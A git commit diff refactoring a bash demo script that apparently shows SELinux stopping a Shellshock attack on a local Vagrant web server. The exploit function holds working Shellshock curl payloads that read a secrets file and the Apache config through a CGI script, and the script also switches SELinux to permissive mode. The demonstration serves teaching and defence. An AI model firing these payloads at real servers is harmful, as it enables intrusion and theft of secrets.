6d457300b1679f811670d6ae77ea6ff0160ca9d6
Garrett Hyde <github@garretthyde.com>
2019-07-16 14:42:05 -0600

    Refactor demo script

--- demo.sh
+++ demo.sh
@@ -3,11 +3,9 @@
 URL="http://web.vm.local"
 SHELL_SCRIPT="${URL}/cgi-bin/shellshock.cgi"
 
-RED='\033[0;31m'   # Continue prompt
-GREEN='\033[0;32m' # Script info
-BLUE='\033[0;34m'  # Command to be run
-WHITE='\033[0;37m' # Command output
-NC='\033[0m'       # No Color
+BLUE='\033[0;34m'   # "Continue?" prompt
+GREEN='\033[0;32m'  # Script info logs
+NC='\033[0m'        # No Color
 
 # Handle CTRL-C
 function ctrl_c() {
@@ -17,29 +15,34 @@ function ctrl_c() {
 }
 trap ctrl_c INT
 
+function wait_to_continue() {
+    # Wait to continue
+    echo -ne "${BLUE}"
+    read -p "Continue? " trash
+    echo -ne "${NC}"
+}
+
+function info_log() {
+    echo -e "${GREEN}$@${NC}"
+}
+
 function echo_cmd() {
     # Print and execute command
     (set -x; "$@")
 
-    # Wait to continue
-    echo
-    echo -ne "${RED}"
-    read -p "Continue? " trash
-    echo -ne "${NC}"
+    wait_to_continue
 }
 
 function exploit() {
     BASE_PAYLOAD="() { :; }; echo;"
 
     echo_cmd curl -A "${BASE_PAYLOAD} /bin/cat /home/vagrant/secrets.txt" ${SHELL_SCRIPT}
-    echo_cmd curl -A "${BASE_PAYLOAD} /bin/head /etc/httpd/conf/httpd.conf" ${SHELL_SCRIPT}
+    echo_cmd curl -A "${BASE_PAYLOAD} /bin/head -n8 /etc/httpd/conf/httpd.conf" ${SHELL_SCRIPT}
 }
 
-echo -e "${GREEN}From the webserver, run the command:"
-echo -e "sudo tail -n0 -f /var/log/audit/audit.log | grep shellshock${NC}"
-echo -ne "${RED}"
-read -p "Continue? " trash
-echo -ne "${NC}"
+info_log "From the webserver, run the command:"
+info_log "sudo tail -n0 -f /var/log/audit/audit.log | grep shellshock$"
+wait_to_continue
 
 # Show webserver is running
 echo_cmd curl "${URL}"
@@ -47,16 +50,16 @@ echo_cmd curl "${SHELL_SCRIPT}"
 
 # Set SELinux to permissive mode
 cd vagrant
-echo -e "${GREEN}Setting SELinux to permissive mode${NC}"
+info_log "Setting SELinux to permissive mode"
 vagrant ssh web -c "sudo setenforce 0" 2> /dev/null
 
 exploit
 
 # Set SELinux to enforcing mode
-echo -e "${GREEN}Setting SELinux to enforcing mode${NC}"
+info_log "Setting SELinux to enforcing mode"
 vagrant ssh web -c "sudo setenforce 1" 2> /dev/null
 
 exploit
 
 cd ..
-echo -e "${GREEN}Finished${NC}"
+info_log "Finished"
